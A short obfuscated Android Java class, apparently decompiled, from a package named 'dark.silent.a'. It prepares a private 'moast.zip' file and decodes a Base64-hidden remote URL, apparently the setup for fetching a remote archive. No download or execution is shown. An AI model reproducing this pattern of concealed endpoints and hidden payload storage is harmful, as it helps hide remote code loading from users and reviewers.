package dark.silent.a;

import android.content.Context;
import android.util.Base64;
import java.io.File;

public final class a {
    public Context a;
    public File b;
    public final byte[] c;
    private final String d = "moast.zip";

    public a(Context context) {
        this.a = context.getApplicationContext();
        this.b = new File(context.getDir("mof", 0), "moast.zip");
        this.c = Base64.decode("aHR0cHM6Ly9hcGkuaW5zbW9iaS5jb20vYWEvbmM=", 0);
    }
}
